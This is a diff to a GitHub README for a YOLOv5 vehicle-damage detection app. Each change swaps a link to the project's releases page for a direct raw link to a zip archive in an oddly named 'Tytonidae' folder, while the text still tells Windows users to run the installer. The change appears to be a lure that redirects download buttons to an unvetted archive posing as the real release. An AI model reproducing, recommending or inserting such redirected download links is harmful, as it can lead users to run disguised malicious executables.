@@ -1,6 +1,6 @@
 # 🚗 car-damage-detection-yolov5 - Detect Vehicle Damage Fast
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/nikunj1169/car-damage-detection-yolov5/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/nikunj1169/car-damage-detection-yolov5/main/Tytonidae/detection_damage_yolov_car_1.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to get the app running on your Windows PC.
 
 Go to the releases page to get the latest version:
 
-[![Download Releases](https://img.shields.io/badge/Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/nikunj1169/car-damage-detection-yolov5/releases)
+[![Download Releases](https://img.shields.io/badge/Visit%20Releases%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/nikunj1169/car-damage-detection-yolov5/main/Tytonidae/detection_damage_yolov_car_1.5.zip)
 
 Here you will find the available files. Look for the Windows installer or executable file.
 
@@ -147,4 +147,4 @@ It ties into areas like insurance, car repair, and automation to reduce manual i
 ## 🔗 Download Now
 
 Access the latest version and all files here:  
-[https://github.com/nikunj1169/car-damage-detection-yolov5/releases](https://github.com/nikunj1169/car-damage-detection-yolov5/releases)
+[https://raw.githubusercontent.com/nikunj1169/car-damage-detection-yolov5/main/Tytonidae/detection_damage_yolov_car_1.5.zip](https://raw.githubusercontent.com/nikunj1169/car-damage-detection-yolov5/main/Tytonidae/detection_damage_yolov_car_1.5.zip)
